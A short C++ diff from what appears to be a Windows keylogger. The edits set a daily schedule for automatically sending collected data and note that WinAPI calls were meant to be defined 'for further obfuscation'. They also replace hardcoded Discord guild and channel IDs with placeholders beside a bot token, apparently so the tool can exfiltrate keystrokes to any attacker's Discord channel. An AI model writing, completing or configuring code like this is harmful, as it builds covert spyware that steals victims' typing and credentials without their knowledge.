@@ -120,10 +120,11 @@ const std::map<int, std::string> keyname{
 };
 
 #define __hrmn(h, m) (h*3600+m*60)
+//Modify this to auto-send at specific time of the day (in 24h)
 const std::vector<time_t> SCHEDULE = {__hrmn(7, 40), __hrmn(8, 30), __hrmn(9, 39), __hrmn(10, 30),
                             __hrmn(13, 39), __hrmn(14, 26), __hrmn(15, 44), __hrmn(16, 29)};
 
-/** Begin define WinAPI function **/
+/** Begin define WinAPI function **/    //for further obfuscation, never implemented
 
 //USER32.DLL
 
@@ -160,7 +161,8 @@ typedef HRESULT(*PSHGetFolderPathW)(HWND, int, HANDLE, DWORD, LPWSTR);
 struct __tCOMMAND_LINE_OPTION {
 	std::string BOT_LOCATION[4] = {
 		"-t", BOT_TOKEN,
-		"664744934003310592", "1056052934921699388"
+        //define Guild ID and Channel ID goes here
+        GUILD_ID, CHANNEL_ID
 	};
 
 	bool COMPRESSED_MODE = false;
